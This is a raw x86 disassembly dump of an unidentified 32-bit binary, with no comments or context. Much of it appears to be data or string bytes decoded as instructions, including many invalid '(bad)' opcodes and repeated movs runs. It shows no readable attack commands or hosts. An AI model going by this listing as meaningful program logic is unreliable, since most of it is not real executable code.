  4225c4:	adc    eax,0x3ba59ba5
  4225c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225ca:	popf   
  4225cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225cc:	sbb    DWORD PTR [ebp-0x5a805a6b],esp
  4225d2:	(bad)  
  4225d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225d4:	fwait
  4225d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225d6:	xchg   DWORD PTR [ebp-0x322e3c2d],esp
  4225dc:	icebp  
  4225dd:	sub    eax,0xf172ff7
  4225e2:	adc    eax,0x3a59109
  4225e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225e8:	fwait
  4225e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225ea:	add    esp,DWORD PTR [ebp-0x5a805a6d]
  4225f0:	xchg   ebp,eax
  4225f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225f2:	sbb    DWORD PTR [ebp-0x5a645a73],esp
  4225f8:	and    DWORD PTR [ebp+0x2dd123d3],0xfffffff1
  4225ff:	or     eax,0x6f170ff7
  422604:	adc    eax,0x3a59169
  422609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42260a:	fwait
  42260b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42260c:	add    esp,DWORD PTR [ebp-0x5a805a6d]
  422612:	xchg   ebp,eax
  422613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422614:	xor    eax,0x9ba58da5
  422619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42261a:	and    DWORD PTR [ebp+0xdd103d3],0xfffffff1
  422621:	ins    DWORD PTR es:[edi],dx
  422622:	imul   DWORD PTR [edi+0x17]
  422625:	dec    edi
  422626:	adc    eax,0x37a59149
  42262b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42262c:	fwait
  42262d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42262e:	jae    0x4225d5
  422630:	popf   
  422631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422632:	sbb    DWORD PTR [ebp-0x5aba5a6b],esp
  422638:	(bad)  
  422639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42263a:	fwait
  42263b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42263c:	and    DWORD PTR [ebp+0x6dd163d3],0xfffffff1
  422643:	dec    ebp
  422644:	test   DWORD PTR [edi+0x16],0x91a914af
  42264b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42264c:	aaa    
  42264d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42264e:	fwait
  42264f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422650:	jae    0x4225f7
  422652:	popf   
  422653:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422654:	pop    ss
  422655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422656:	xchg   ebp,eax
  422657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422658:	push   ecx
  422659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42265a:	mov    DWORD PTR [ebp-0x5a725a65],esp
  422660:	rol    DWORD PTR [ebx-0x2f],cl
  422663:	dec    ebp
  422664:	lock lods eax,DWORD PTR ds:[esi]
  422666:	imul   BYTE PTR [edi-0x76eb70ea]
  42266c:	xchg   ecx,eax
  42266d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42266e:	aaa    
  42266f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422670:	fwait
  422671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422672:	jae    0x422619
  422674:	popf   
  422675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422676:	cmp    esp,DWORD PTR [ebp-0x5a8c5a6b]
  42267c:	(bad)  
  42267d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42267e:	fwait
  42267f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422680:	xchg   DWORD PTR [ebp-0x522f5c2e],esp
  422686:	lock (bad) 
  422688:	test   BYTE PTR [edi-0x16eb10ea],0x91
  42268f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422690:	aaa    
  422691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422692:	fwait
  422693:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422694:	jae    0x42263b
  422696:	popf   
  422697:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422698:	cmp    DWORD PTR [ebp-0x5a805a6b],esp
  42269e:	(bad)  
  42269f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a0:	fwait
  4226a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a2:	and    DWORD PTR [ebp-0x722f7c2e],0xfffffff0
  4226a9:	in     eax,dx
  4226aa:	imul   bh
  4226ac:	push   ss
  4226ad:	iret   
  4226ae:	adc    al,0xc9
  4226b0:	xchg   ecx,eax
  4226b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226b2:	cmp    eax,0x51a59ba5
  4226b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226b8:	popf   
  4226b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ba:	jnp    0x422661
  4226bc:	xchg   ebx,eax
  4226bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226be:	fwait
  4226bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226c0:	xchg   ecx,eax
  4226c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226c2:	shl    bl,cl
  4226c4:	shr    ch,1
  4226c6:	lock int 0xf6
  4226c9:	iret   
  4226ca:	push   ss
  4226cb:	das    
  4226cc:	adc    al,0x29
  4226ce:	push   ss
  4226cf:	unpcklps xmm1,XMMWORD PTR [ecx]
  4226d2:	xchg   ebx,eax
  4226d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226d4:	adc    DWORD PTR [ebp-0x5ab65a65],esp
  4226da:	lahf   
  4226db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226dc:	cmp    esp,DWORD PTR [ebp-0x5a825a6d]
  4226e2:	mov    DWORD PTR [ebp-0x5a725a65],esp
  4226e8:	shl    BYTE PTR [ebx],cl
  4226ea:	shr    BYTE PTR ds:0xff60df0,1
  4226f0:	push   ss
  4226f1:	outs   dx,DWORD PTR ds:[esi]
  4226f2:	adc    al,0x69
  4226f4:	xchg   ecx,eax
  4226f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226f6:	add    BYTE PTR [eax],al
  4226f8:	and    BYTE PTR ds:0x278c0042,0x42
  4226ff:	add    BYTE PTR [edi+eiz*1+0x291c0042],dl
  422706:	inc    edx
  422707:	add    BYTE PTR [eax+0x25],bh
  42270a:	inc    edx
  42270b:	add    BYTE PTR [eax-0x41ffbdd9],bl
  422711:	jle    0x422755
  422713:	add    BYTE PTR [esi],dh
  422715:	add    DWORD PTR [edx+0x0],0x422888
  42271c:	or     al,0x29
  42271e:	inc    edx
  42271f:	add    BYTE PTR [edi+eiz*1+0x42],dh
  422723:	add    BYTE PTR [eax+0x27],bh
  422726:	inc    edx
  422727:	add    BYTE PTR [eax],cl
  422729:	sub    DWORD PTR [edx+0x0],eax
  42272c:	fsub   QWORD PTR [edi]
  42272e:	inc    edx
  42272f:	add    BYTE PTR [edx-0x36],cl
  422732:	push   es
  422733:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422734:	scas   al,BYTE PTR es:[edi]
  422735:	or     eax,0x2790a506
  42273a:	inc    edx
  42273b:	add    BYTE PTR [eax+0x28],al
  42273e:	inc    edx
  42273f:	add    BYTE PTR [eax+ebp*1+0x42],dl
  422743:	add    BYTE PTR [eax+0x28],ah
  422746:	inc    edx
  422747:	add    BYTE PTR [eax+0x28],dh
  42274a:	inc    edx
  42274b:	add    al,cl
  42274d:	daa    
  42274e:	inc    edx
  42274f:	add    BYTE PTR [ebp+eiz*1+0x42],bh
  422753:	add    al,ch
  422755:	daa    
  422756:	inc    edx
  422757:	add    al,bl
  422759:	daa    
  42275a:	inc    edx
  42275b:	add    BYTE PTR [eax],ah
  42275d:	sub    DWORD PTR [edx+0x0],eax
  422760:	scas   al,BYTE PTR es:[edi]
  422761:	fwait
  422762:	push   es
  422763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422764:	cmp    BYTE PTR [edx-0x19],al
  422767:	mov    esp,0x4227f8
  42276c:	add    BYTE PTR [eax],ch
  42276e:	inc    edx
  42276f:	add    BYTE PTR [edi+eiz*1-0x79dbffbe],bl
  422776:	loopne 0x422734
  422778:	jbe    0x4227f4
  42277a:	pop    ds
  42277b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42277c:	add    BYTE PTR [eax],al
  42277e:	inc    eax
  42277f:	add    cl,dh
  422781:	retf   
  422782:	arpl   WORD PTR [eax+0x33],bx
  422785:	add    DWORD PTR [edx+0x0],0x6ae878a8
  42278c:	ja     0x42279c
  42278e:	pop    ebx
  42278f:	xor    BYTE PTR [esi-0x6],dh
  422792:	(bad)  
  422793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422794:	mov    dl,0xd
  422796:	xchg   ebx,eax
  422797:	test   eax,0x422784
  42279c:	stos   BYTE PTR es:[edi],al
  42279d:	fild   DWORD PTR [esi]
  42279f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227a0:	stos   BYTE PTR es:[edi],al
  4227a1:	fild   WORD PTR [esi]
  4227a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227a5:	fild   DWORD PTR [esi]
  4227a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227a8:	mov    ds:0xbea506db,al
  4227ad:	fild   DWORD PTR [esi]
  4227af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227b0:	mov    edx,0xb6a506db
  4227b5:	fild   DWORD PTR [esi]
  4227b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227b8:	mov    dl,0xdb
  4227ba:	push   es
  4227bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227bc:	mov    ds,ebx
  4227be:	push   es
  4227bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227c0:	mov    bl,bl
  4227c2:	push   es
  4227c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227c4:	out    dx,al
  4227c5:	fild   DWORD PTR [esi]
  4227c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227c8:	dec    DWORD PTR [edx]
  4227ca:	adc    edi,DWORD PTR [ebx]
  4227cc:	je     0x4227f3
  4227ce:	inc    edx
  4227cf:	add    BYTE PTR [ebp+0x2a],ah
  4227d2:	inc    edx
  4227d3:	add    BYTE PTR [ecx+0x73],ah
  4227d6:	push   0x69bae79
  4227db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227dc:	cmp    cl,dl
  4227de:	xlat   BYTE PTR ds:[ebx]
  4227df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227e0:	dec    sp
  4227e2:	add    BYTE PTR [eax],al
  4227e4:	jo     0x42280b
  4227e6:	inc    edx
  4227e7:	add    BYTE PTR [edx],ah
  4227e9:	inc    edx
  4227ea:	sbb    eax,DWORD PTR [ebx+0x0]
	...
  4227f8:	hlt    
  4227f9:	stc    
  4227fa:	sar    BYTE PTR [edi+edi*4+0x2b309341],cl
  422801:	inc    esi
  422802:	pop    ds
  422803:	jg     0x422805
	...
  422829:	add    BYTE PTR [eax],al
  42282b:	add    BYTE PTR [esi+0x427e],bh
	...
  422839:	add    BYTE PTR [eax],al
  42283b:	add    BYTE PTR [edi-0x4c],al
  42283e:	inc    ecx
  42283f:	add    BYTE PTR [ebp-0x5b],cl
  422842:	push   ecx
  422843:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422844:	jg     0x4227eb
  422846:	inc    edi
  422847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422848:	push   ecx
  422849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42284a:	inc    ebx
  42284b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42284c:	std    
  42284d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42284e:	jmp    DWORD PTR [ebp+0xa59b]
  422854:	push   ebp
  422855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422856:	push   ebx
  422857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422858:	dec    ecx
  422859:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42285a:	std    
  42285b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42285c:	jmp    DWORD PTR [ebp-0x5a8e5a65]
  422862:	jge    0x422809
  422864:	push   ecx
  422865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422866:	jg     0x42280d
  422868:	std    
  422869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42286a:	jmp    DWORD PTR [ebp+0xa59b]
  422870:	jge    0x422817
  422872:	dec    ebx
  422873:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422874:	inc    ebx
  422875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422876:	jne    0x42281d
  422878:	pop    ecx
  422879:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42287a:	jnp    0x422821
  42287c:	dec    ecx
  42287d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42287e:	fwait
  42287f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  422888:	xor    eax,ecx
  42288a:	xor    esp,DWORD PTR [ecx]
  42288c:	xor    eax,DWORD PTR [ecx]
  42288e:	xor    esp,DWORD PTR [ecx+0x33]
  422891:	inc    ecx
  422892:	xor    ah,BYTE PTR [ecx-0x1ecd7ece]
  422898:	xor    al,cl
  42289a:	xor    ah,BYTE PTR [ecx]
  42289c:	xor    al,BYTE PTR [ecx]
  42289e:	xor    ah,BYTE PTR [ecx+0x32]
  4228a1:	inc    ecx
  4228a2:	xor    eax,DWORD PTR [ecx-0x3ccc1ecd]
  4228a8:	xor    ecx,ebp
  4228aa:	xor    ecx,edi
  4228ac:	xor    ecx,ecx
  4228ae:	xor    ecx,ebx
  4228b0:	xor    edx,ebp
  4228b2:	xor    edx,edi
  4228b4:	xor    edx,ecx
  4228b6:	xor    edx,ebx
  4228b8:	xor    ebx,ebp
  4228ba:	xor    ebx,edi
  4228bc:	xor    ebx,ecx
  4228be:	xor    ebx,ebx
  4228c0:	xor    eax,edi
  4228c2:	push   ebx
  4228c3:	shl    DWORD PTR [ebx-0x3f],0x93
  4228c7:	rcl    BYTE PTR [esi-0x55],0x15
  4228cb:	iret   
  4228cc:	xchg   ebp,eax
  4228cd:	dec    eax
  4228ce:	xor    ecx,ebp
  4228d0:	sbb    eax,0x50aaaae3
  4228d5:	imul   ebx,DWORD PTR [esi],0x2f
  4228d8:	je     0x4228ef
  4228da:	mov    DWORD PTR [edx+0x556ad694],ecx
  4228e0:	imul   edi,ebx,0xffffffd5
  4228e3:	enter  0x4927,0xef
  4228e7:	popf   
  4228e8:	mov    dh,0xde
  4228ea:	dec    esi
  4228eb:	xchg   esp,eax
  4228ec:	lock xor BYTE PTR [esi-0x6b],ch
  4228f0:	inc    ebp
  4228f1:	or     al,0x76
  4228f3:	or     DWORD PTR [edi-0x40],eax
  4228f6:	js     0x4228b2
  4228f8:	popa   
  4228f9:	pop    eax
  4228fa:	jecxz  0x422966
  4228fc:	mov    BYTE PTR [ebx-0x56],0x4
  422900:	cs leave 
  422902:	inc    esi
  422903:	stos   DWORD PTR es:[edi],eax
  422904:	inc    esp
  422905:	ds inc ebp
  422907:	enter  0x82f6,0x93
  42290b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42290c:	sbb    DWORD PTR [eax],ecx
  42290e:	fdivr  DWORD PTR [esp+ebp*1-0x1e]
  422912:	inc    edx
  422913:	add    cl,dl
  422915:	ja     0x422986
  422917:	gs jl  0x422941
  42291a:	inc    edx
  42291b:	add    al,ah
  42291d:	daa    
  42291e:	inc    edx
  42291f:	add    BYTE PTR [esi-0x6],dh
  422922:	fbld   TBYTE PTR [eax+eax*1+0x0]
  422929:	add    BYTE PTR [eax],al
  42292b:	add    BYTE PTR [eax],al
  42292d:	add    BYTE PTR [eax],al
  42292f:	add    BYTE PTR [eax-0x15],bl
  422932:	push   ss
  422933:	cmp    eax,0x65646543
  422938:	push   esi
  422939:	imul   ebp,DWORD PTR gs:[esi+0x6f],0x616f7377
  422941:	jb     0x4229b7
  422943:	gs bound esp,QWORD PTR gs:[ecx+0x6c]
  422948:	jecxz  0x422911
  42294a:	shr    DWORD PTR [ebx+edx*8-0x3f],0xa3
  42294f:	cmp    al,BYTE PTR [esi-0x2d]
  422952:	jno    0x4229ce
  422954:	outs   dx,DWORD PTR ds:[esi]
  422955:	jae    0x4229c7
  422957:	popa   
  422958:	je     0x4229c2
  42295a:	bound  esp,QWORD PTR [ecx+0x73]
  42295d:	je     0x4229ce
  42295f:	outs   dx,DWORD PTR ds:[esi]
  422960:	test   eax,0xde3655f5
  422965:	in     al,0x6c
  422967:	jne    0x4229d1
  422969:	bound  esp,QWORD PTR [ebp+0x4b]
  42296c:	popa   
  42296d:	jbe    0x4229d0
  42296f:	outs   dx,WORD PTR ds:[esi]
  422971:	jns    0x4229e2
  422973:	imul   edi,DWORD PTR [eax],0x2c054cf4
  422979:	pusha  
  42297a:	and    BYTE PTR [edi+0x79],dh
  42297d:	gs jo  0x4229ef
  422980:	ins    DWORD PTR es:[edi],dx
  422981:	ja     0x4229fc
  422983:	gs inc ebp
  422985:	jns    0x4229ec
  422987:	jb     0x422989
	...
  422999:	add    BYTE PTR [eax],al
  42299b:	add    BYTE PTR [esi-0x4e],dl
  42299e:	and    dl,BYTE PTR [ecx]
  4229a0:	imul   esp,DWORD PTR [ebx+0x75],0x74
  4229a4:	imul   ebp,DWORD PTR [di+0x70],0xd71e3755
  4229ac:	fldcw  WORD PTR [eax+edx*2]
  4229af:	fimul  WORD PTR [ebx]
  4229b1:	cmp    esi,DWORD PTR [esp+eax*4-0x66]
  4229b5:	fldcw  WORD PTR [eax+0x69]
  4229b8:	lods   al,BYTE PTR ds:[esi]
  4229b9:	repnz retf 0xe41c
  4229bd:	inc    ebx
  4229be:	outs   dx,DWORD PTR ds:[esi]
  4229bf:	je     0x422a34
  4229c1:	dec    esp
  4229c2:	popa   
  4229c3:	jp     0x422a3e
  4229c5:	push   ebx
  4229c6:	imul   esp,DWORD PTR [ecx+0x73],0x73
  4229ca:	push   0xc3066a00
  4229cf:	lds    eax,FWORD PTR [eax+0x6569646f]
  4229d5:	add    al,bl
  4229d7:	mov    ebp,0x2ee9d1e4
  4229dc:	jle    0x422990
  4229de:	data16 gs ja 0x422a55
  4229e2:	jne    0x422a46
  4229e4:	add    BYTE PTR [eax],al
  4229e6:	add    DWORD PTR [edx+0x51cf72f8],edi
  4229ec:	fstp   DWORD PTR [eax+0x74]
  4229ef:	popa   
  4229f0:	jae    0x422a64
  4229f2:	popa   
  4229f3:	js     0x422a5d
  4229f5:	outs   dx,DWORD PTR ds:[esi]
  4229f6:	add    BYTE PTR [eax],al
  4229f8:	mov    esi,0x4d270df8
  4229fd:	popa   
  4229fe:	ins    BYTE PTR es:[edi],dx
  4229ff:	je     0x422a4d
  422a01:	jne    0x422a75
  422a03:	imul   eax,DWORD PTR [eax],0x0
  422a06:	dec    edx
  422a07:	loope  0x422a17
  422a09:	out    0xd3,al
  422a0b:	test   al,0x57
  422a0d:	popa   
  422a0e:	jb     0x422a7b
  422a10:	jne    0x422a86
  422a12:	outs   dx,DWORD PTR fs:[esi]
  422a14:	bound  ebp,QWORD PTR [edi+0x0]
  422a17:	add    BYTE PTR [ebp+eax*1+0x62cfc27],dl
  422a1e:	jne    0x422a8d
  422a20:	outs   dx,DWORD PTR ds:[esi]
  422a21:	js     0x422a23
  422a23:	add    BYTE PTR [ecx+edx*8+0x58],ch
  422a27:	or     bh,BYTE PTR [ecx+ebx*2]
  422a2a:	add    al,0xd6
  422a2c:	gs ins DWORD PTR es:[edi],dx
  422a2e:	jns    0x422a9f
  422a30:	jo     0x422aa7
  422a32:	je     0x422a87
  422a34:	push   0x6170676f
  422a39:	jns    0x422aa5
  422a3b:	outs   dx,DWORD PTR ds:[esi]
  422a3c:	popa   
  422a3d:	jns    0x4229f9
  422a3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a40:	scas   al,BYTE PTR es:[edi]
  422a41:	or     al,0xaf
  422a43:	adc    al,0x63
  422a45:	popa   
  422a46:	jns    0x422a8f
  422a48:	jne    0x422ac0
  422a4a:	jae    0x422ac0
  422a4c:	imul   esp,DWORD PTR [ebx+0x73],0x61636f6e
  422a53:	jb     0x422aba
  422a55:	imul   ebp,DWORD PTR [ecx+0x25],0xffffffda
  422a59:	(bad)  
  422a5a:	out    dx,al
  422a5b:	push   ebx
  422a5c:	popa   
  422a5d:	arpl   WORD PTR [ebx+0x66],si
  422a60:	imul   esp,DWORD PTR [edx+0x64],0x9780006f
  422a67:	xchg   DWORD PTR [esi-0x7488fe6a],edx
  422a6d:	push   eax
  422a6e:	ja     0x4229fa
  422a70:	cdq    
  422a71:	adc    bh,0x8a
  422a74:	pop    esi
  422a75:	fldenv [ecx+0x6f5038a6]
  422a7b:	adc    bh,0x8b
  422a7e:	arpl   WORD PTR [edx],si
  422a80:	test   eax,0x92fcefd7
  422a85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a86:	xchg   ah,bh
  422a88:	fsubr  st,st(7)
  422a8a:	arpl   sp,di
  422a8c:	fsub   DWORD PTR [esi+0xc92fc86]
  422a92:	cdq    
  422a93:	jo     0x422b09
  422a95:	xchg   edi,eax
  422a96:	add    BYTE PTR [edi+0x77019696],0x8b
  422a9d:	push   eax
  422a9e:	ja     0x422a2a
  422aa0:	adc    BYTE PTR [edi-0x2703a176],0x5b
  422aa7:	cmp    BYTE PTR [eax+0xc],dl
  422aaa:	adc    BYTE PTR [edi-0x28089c75],0x9
  422ab1:	xor    BYTE PTR [edi-0x11],0xfc
  422ab5:	xchg   edx,eax
  422ab6:	xor    BYTE PTR [ebp+0x138c6dfc],ah
  422abc:	cld    
  422abd:	xchg   edx,eax
  422abe:	outs   dx,DWORD PTR ds:[esi]
  422abf:	mov    ds:0x31ec92fc,eax
  422ac4:	jo     0x422ac1
  422ac6:	out    dx,al
  422ac7:	lea    edx,[edi-0x69697880]
  422acd:	add    DWORD PTR [edi-0x75],esi
  422ad0:	push   eax
  422ad1:	ja     0x422a5d
  422ad3:	adc    BYTE PTR [edi-0x2326a176],0x1c
  422ada:	hlt    
  422adb:	push   eax
  422adc:	or     al,0x80
  422ade:	xchg   edi,eax
  422adf:	mov    esp,DWORD PTR [ebx-0x9]
  422ae2:	xlat   BYTE PTR ds:[ebx]
  422ae3:	out    dx,al
  422ae4:	cld    
  422ae5:	xchg   edx,eax
  422ae6:	mov    WORD PTR [ebx],ss
  422ae8:	xor    BYTE PTR [edi-0x11],0xfc
  422aec:	xchg   edx,eax
  422aed:	cmp    dl,BYTE PTR [esi+0x65306dfc]
  422af3:	jo     0x422af0
  422af5:	out    dx,al
  422af6:	lea    edx,[edi-0x69697880]
  422afc:	add    DWORD PTR [edi-0x75],esi
  422aff:	push   eax
  422b00:	ja     0x422a8c
  422b02:	cdq    
  422b03:	adc    bh,0x8a
  422b06:	pop    esi
  422b07:	fsubrp st(7),st
  422b09:	xor    edi,DWORD PTR [eax+edx*2]
  422b0c:	outs   dx,DWORD PTR ds:[esi]
  422b0d:	adc    bh,0x8b
  422b10:	arpl   WORD PTR [edx],si
  422b12:	test   eax,0xd8fca6d7
  422b17:	out    dx,al
  422b18:	fwait
  422b19:	mov    ecx,0x31ec927c
  422b1e:	fwait
  422b1f:	cld    
  422b20:	or     al,0x43
  422b22:	jo     0x422b98
  422b24:	xchg   edi,eax
  422b25:	add    BYTE PTR [edi+0x77019696],0x8b
  422b2c:	push   eax
  422b2d:	ja     0x422ab9
  422b2f:	adc    BYTE PTR [edi-0x6d1fa176],0x3b
  422b36:	cmp    BYTE PTR [eax+0xc],dl
  422b39:	adc    BYTE PTR [edi-0x28089c75],0xff
  422b40:	xor    BYTE PTR [edi-0x11],0xfc
  422b44:	xchg   edx,eax
  422b45:	out    dx,eax
  422b46:	mov    ds:0x963a6dfc,eax
  422b4b:	cld    
  422b4c:	xchg   edx,eax
  422b4d:	das    
  422b4e:	stos   DWORD PTR es:[edi],eax
  422b4f:	jo     0x422b4c
  422b51:	out    dx,al
  422b52:	lea    ebx,[ebx-0x7f686c67]
  422b58:	xchg   DWORD PTR [eax+0x773a3577],eax
  422b5e:	cmp    eax,0xd7808a0a
  422b63:	sbb    eax,0x9925d73a
  422b68:	adc    bh,0x15
  422b6b:	dec    eax
  422b6c:	shr    DWORD PTR [edx-0x12f24e71],1
  422b72:	std    
  422b73:	dec    ebp
  422b74:	xchg   esp,eax
  422b75:	test   BYTE PTR [ebx-0x9],cl
  422b78:	or     cl,BYTE PTR [edi+0x4dfded51]
  422b7e:	xchg   esp,eax
  422b7f:	test   BYTE PTR [ebx-0x9],cl
  422b82:	or     cl,BYTE PTR [esi+edi*8]
  422b85:	or     BYTE PTR ds:0x432187ed,0x6a
  422b8c:	ins    DWORD PTR es:[edi],dx
  422b8d:	or     cl,BYTE PTR [edx]
  422b8f:	or     cl,BYTE PTR [edx]
  422b91:	or     bl,BYTE PTR [ebx-0x1266f4bd]
  422b97:	adc    DWORD PTR [ebp+0x5e],ecx
  422b9a:	(bad)  
  422b9b:	in     al,dx
  422b9c:	lea    ecx,[ebp+0x10018494]
  422ba2:	pop    ecx
  422ba3:	mov    WORD PTR [ebp-0x1172a173],cs
  422ba9:	(bad)  
  422baa:	out    dx,al
  422bab:	mov    dh,0xbe
  422bad:	mov    BYTE PTR [edx+eiz*8+0x2f],0x9f
  422bb2:	xchg   BYTE PTR [ecx+0xc],ah
  422bb5:	lea    ecx,[ebp+0x5901cbf8]
  422bbb:	add    DWORD PTR [ebx-0x80],ebp
  422bbe:	out    0x8a,eax
  422bc0:	xor    BYTE PTR [edi+0x32],0x43
  422bc4:	out    0x35,eax
  422bc6:	xor    edi,DWORD PTR [eax+edx*2+0x77]
  422bca:	xchg   BYTE PTR [edx-0x73],ah
  422bcd:	xchg   BYTE PTR [edi+0x98d8d0c],al
  422bd3:	dec    edi
  422bd4:	repnz lea ecx,[ebp-0x370f7073]
  422bdb:	xor    esp,edi
  422bdd:	xchg   DWORD PTR [esp+edi*4+0xbefbecd],edx
  422be4:	mov    al,ds:0xec9d8894
  422be9:	or     eax,0xeb6501a9
  422bee:	mov    dl,0xbc
  422bf0:	out    dx,eax
  422bf1:	mov    WORD PTR gs:[esi-0x3a17beff],gs
  422bf8:	mov    eax,ds:0x99968d8d
  422bfd:	cli    
  422bfe:	lea    edi,[edx]
  422c00:	lea    ecx,[ebp-0x1bc59df6]
  422c06:	push   ebp
  422c07:	and    bh,0x8a
  422c0a:	inc    ebx
  422c0b:	out    0x83,eax
  422c0d:	or     eax,esp
  422c0f:	imul   eax,DWORD PTR [eax-0x43495039],0xffffff80
  422c16:	push   ecx
  422c17:	xor    ecx,DWORD PTR [ebx-0x14]
  422c1a:	push   ecx
  422c1b:	add    ebp,eax
  422c1d:	lock lea eax,[esi-0x7272f3a0]
  422c24:	cmp    ch,0xb2
  422c27:	mov    bh,ch
  422c29:	in     eax,dx
  422c2a:	mov    edx,0xfa05633a
  422c2f:	lea    edi,[edx]
  422c31:	lea    ecx,[ebp-0x39c5e29]
  422c37:	in     al,0x9c
  422c39:	les    esp,FWORD PTR [edi]
  422c3b:	add    bh,0xaf
  422c3e:	xchg   cl,ch
  422c40:	or     al,0x8d
  422c42:	(bad)  
  422c43:	loop   0x422c7f
  422c45:	scas   al,BYTE PTR es:[edi]
  422c46:	in     al,dx
  422c47:	sti    
  422c48:	in     al,dx
  422c49:	ret    0x86ed
  422c4c:	cmp    ch,ch
  422c4e:	mov    BYTE PTR [edx],bh
  422c50:	sub    BYTE PTR [edx+0x63],0xfc
  422c54:	sub    BYTE PTR [edx-0x1c],0xb4
  422c58:	scas   al,BYTE PTR es:[edi]
  422c59:	fsubr  st,st(5)
  422c5b:	test   DWORD PTR [edi],ebp
  422c5d:	fiadd  DWORD PTR [eax-0x27f61b02]
  422c63:	in     eax,dx
  422c64:	test   edi,edi
  422c66:	fimul  DWORD PTR [esi-0x1b8ff212]
  422c6c:	out    dx,al
  422c6d:	mov    cs,WORD PTR [ebp+ecx*1-0x5549bc90]
  422c74:	(bad)  
  422c75:	leave  
  422c76:	bound  esi,QWORD PTR [edx-0x367902f3]
  422c7c:	or     al,0x8d
  422c7e:	(bad)  
  422c7f:	xlat   BYTE PTR ds:[ebx]
  422c80:	adc    eax,0x9faeab9d
  422c85:	scas   al,BYTE PTR es:[edi]
  422c86:	lahf   
  422c87:	dec    ebp
  422c88:	push   ebp
  422c89:	xor    eax,0xb5f1aa96
